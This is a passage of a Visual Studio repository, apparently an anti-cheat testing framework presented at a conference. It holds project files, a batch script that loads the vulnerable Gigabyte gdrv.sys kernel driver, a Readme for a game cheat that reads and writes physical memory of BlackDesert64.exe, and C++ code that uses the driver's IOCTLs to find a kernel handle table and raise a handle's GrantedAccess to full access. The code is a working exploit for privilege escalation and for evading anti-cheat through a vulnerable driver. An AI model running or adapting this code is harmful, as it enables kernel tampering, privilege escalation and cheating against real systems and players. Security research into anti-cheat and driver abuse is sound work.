      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{99F47B02-FAAF-4C0D-9D9B-DFAD35E1F38B}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>HandleElevationDriver</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release2|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release2|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release2|Win32'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release2|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release2|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release2|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;$(SolutionDir)DriverHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalLibraryDirectories>$(SolutionDir)x64\Debug;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release2|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;$(SolutionDir)DriverHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalLibraryDirectories>$(SolutionDir)x64\Debug;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release2|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;$(SolutionDir)DriverHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalLibraryDirectories>$(SolutionDir)x64\Debug;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="pch.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="ExternalCheatDriver.cpp" />
    <ClCompile Include="pch.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release2|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release2|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ProjectReference Include="..\CheatHelper\CheatHelper.vcxproj">
      <Project>{a080c117-d1db-4671-8217-65496573ba4d}</Project>
    </ProjectReference>
    <ProjectReference Include="..\DriverHelper\DriverHelper.vcxproj">
      <Project>{36244ba2-d910-4746-8ed2-7cfa55fb4de9}</Project>
    </ProjectReference>
  </ItemGroup>
  <ItemGroup>
    <None Include="LoadDriver.bat" />
    <None Include="Readme.md" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`ExternalCheatDriver/HandleElevationDriver.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="pch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="pch.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HandleElevationDriver.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="Readme.md" />
    <None Include="LoadDriver.bat">
      <Filter>Source Files</Filter>
    </None>
  </ItemGroup>
</Project>
```

`ExternalCheatDriver/LoadDriver.bat`:

```bat
sc create Gigabyte binpath= "E:\Recon2019\AntiCheat-Testing-Framework\resources\gdrv.sys" type= kernel
sc start Gigabyte
```

`ExternalCheatDriver/Readme.md`:

```md
# External Cheat Driver

## Introduction

Implementation that abuse of a vulnerable driver to Read/Write from physical memory in order to directly read/modify the target process.
The main purpose is to avoid performing a DKOM, which would be much easier to be detected.
This implementation uses gigabyte driver to achieve its goal, however, changing the vulnerable driver should be quite easy, given that all the methods are created in a modular way inside DriverHelper.

## Usage

This module makes use of **DriverHelper** and **CheatHelper**.

> Note that this module has been created as a PoC to manipulate one particular game (BlackDesertOnline), however, the method `ActivateHack` can be modified in order to create any desired PoC.


## Configuration

This module requires configuration:

- The following variables in config.ini need to the provided:

[Strings]
```
targetProc=BlackDesert64.exe
driverName=\\.\GIO
```

## Notes

- driverName: Name of the driver device to exploit
- targetProc: Process name of the game
 

```

`ExternalCheatDriver/pch.cpp`:

```cpp
// pch.cpp: source file corresponding to pre-compiled header; necessary for compilation to succeed

#include "pch.h"

// In general, ignore this file, but keep it around if you are using pre-compiled headers.

```

`ExternalCheatDriver/pch.h`:

```h
// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

#ifndef PCH_H
#define PCH_H

// TODO: add headers that you want to pre-compile here

#endif //PCH_H

```

`HandleElevationDriver/HandleElevationDriver.cpp`:

```cpp
// HandleElevationDriver.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include "CheatHelper.h"
#include "DriverHelper.h"
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <cstdint>



// Definition of IOCTL numbers
// GPCIDrv64 Driver
#define IOCTL_MAPPHYSICAL	0x9C402580
#define IOCTL_UNMAPPHYSICAL	0x9C402584
// GIO Driver
#define IOCTL_GIO_MAPPHYSICAL	0xC3502004
#define IOCTL_GIO_UNMAPPHYSICAL 0xC3502008
#define IOCTL_GIO_MEMCPY 0xC3502808

// Kernel offsets
// W10
#define OFFSET_IMAGEFILENAME 0x450
#define OFFSET_OBJECTTABLE 0x418

#pragma comment(lib, "ntdll.lib")


ULONG64 GIO_mapPhysical(ULONG64 physicaladdress, DWORD size)
{
	READ_REQUEST inbuffer = { 0, 0, physicaladdress, 0, size };
	ULONG64 outbuffer[2] = { 0 };
	DWORD bytes_returned = 0;
	DeviceIoControl(DriverHelper::hDeviceDrv,
		IOCTL_GIO_MAPPHYSICAL,
		&inbuffer,
		sizeof(inbuffer),
		&outbuffer,
		sizeof(outbuffer),
		&bytes_returned,
		(LPOVERLAPPED)NULL);

	return outbuffer[0];
}

ULONG64 GIO_unmapPhysical(ULONG64 address)
{
	ULONG64 inbuffer = address;
	ULONG64 outbuffer[2] = { 0 };
	DWORD bytes_returned = 0;
	DeviceIoControl(DriverHelper::hDeviceDrv,
		IOCTL_GIO_UNMAPPHYSICAL,
		(LPVOID)&inbuffer,
		sizeof(inbuffer),
		(LPVOID)outbuffer,
		sizeof(outbuffer),
		&bytes_returned,
		(LPOVERLAPPED)NULL);

	return outbuffer[0];
}

BOOL GIO_memcpy(ULONG64 dest, ULONG64 src, DWORD size)
{
	MEMCPY_REQUEST mystructIn = { dest, src, size };
	BYTE outbuffer[0x30] = { 0 };
	DWORD returned = 0;

	DeviceIoControl(DriverHelper::hDeviceDrv, IOCTL_GIO_MEMCPY, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);
	if (returned) {
		return TRUE;
	}
	return FALSE;
}



ULONG64 GPCI_mapPhysical(DWORDLONG physicaladdress, DWORD size)
{
	READ_REQUEST inbuffer = { physicaladdress, size };
	ULONG64 outbuffer[2] = {0};
	DWORD bytes_returned = 0;
	DeviceIoControl(DriverHelper::hDeviceDrv,
		IOCTL_MAPPHYSICAL,				
		&inbuffer,             
		sizeof(inbuffer),      
		&outbuffer,            
		sizeof(outbuffer),
		&bytes_returned,           
		(LPOVERLAPPED)NULL);

	return outbuffer[0];
}

ULONG64 GPCI_unmapPhysical(ULONG64 address)
{
	ULONG64 inbuffer = address;
	ULONG64 outbuffer[2] = { 0 };
	DWORD bytes_returned = 0;

	DeviceIoControl(DriverHelper::hDeviceDrv,
		IOCTL_UNMAPPHYSICAL,
		(LPVOID)&inbuffer,
		sizeof(inbuffer),
		(LPVOID)outbuffer,
		sizeof(outbuffer),
		&bytes_returned, 
		(LPOVERLAPPED)NULL);
	
	return outbuffer[0];
}

_EPROCESS_PATTERN pivotProcess = { "lsass.exe", 0x2 };
PBYTE ppivotProcess = NULL;


int main()
{
	std::cout << "[+] Init" << std::endl;
	CheatHelper::loadConfig();


	// Connecting the vulnerable driver (GPCIDrv64.sys AORUS GRAPHICS ENGINE v1.25)
	std::cout << "[+] Obtaining HANDLE to Drv" << std::endl;
	if (DriverHelper::getDeviceHandle(CheatHelper::driverName))
	{
		return 1;
	}

	// If we want to change the driver, we just need to create our functions for communication and set the following variables
	DriverHelper::fn_memcpy = (_fn_memcpy)GIO_memcpy;
	DriverHelper::fn_mapPhysical = (_fn_mapPhysical)GIO_mapPhysical;
	DriverHelper::fn_unmapPhysical = (_fn_unmapPhysical)GIO_unmapPhysical;

	DWORDLONG stopAddress = _UI64_MAX;
	DWORD     searchSpace = 0x00001000;
	
	PBYTE ppivotProcess = (PBYTE)malloc(sizeof(_EPROCESS_PATTERN));
	memcpy(ppivotProcess, &pivotProcess, sizeof(_EPROCESS_PATTERN));


	ULONG64 objectTable = DriverHelper::findPhisical_ObjectTable(CheatHelper::startAddressPhy, stopAddress, searchSpace, ppivotProcess, sizeof(_EPROCESS_PATTERN));
	Sleep(1000);
	void** pObjectTable = (void**)objectTable;

	PBYTE pHandleTable = (PBYTE)malloc(sizeof(_HANDLE_TABLE));
	DriverHelper::fn_memcpy((ULONG64)pHandleTable, (ULONG64)*pObjectTable, sizeof(_HANDLE_TABLE));

	ULONG64 entryAddr = (ULONG64)malloc(sizeof(_HANDLE_TABLE_ENTRY));

	//TODO: add offsets and test in W7
	entryAddr = DriverHelper::ExpLookupHandleTableEntryW10((ULONGLONG)pHandleTable, (ULONGLONG)CheatHelper::requestHandleDrv);

	HANDLE_TABLE_ENTRY entry;
	DriverHelper::fn_memcpy((ULONG64)&entry, entryAddr, sizeof(_HANDLE_TABLE_ENTRY));
	
	Sleep(1000);
	std::cout << "[+] GrantedAccess original: " << std::hex << entry.GrantedAccess << std::endl;
	entry.GrantedAccess = 0x1FFFFF;
	
	DriverHelper::fn_memcpy(entryAddr + sizeof(ULONGLONG), (ULONG64)&entry + sizeof(ULONGLONG), sizeof(_HANDLE_TABLE_ENTRY) - sizeof(+sizeof(ULONGLONG)));
	std::cout << "[+] GrantedAccess overwritten" << std::endl;
	return 0;

}
```

`HandleElevationDriver/HandleElevationDriver.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{97D0792B-4385-450B-9E85-79494037D730}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>HandleElevationDriver</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;$(SolutionDir)DriverHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalLibraryDirectories>$(SolutionDir)x64\Debug;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;$(SolutionDir)DriverHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
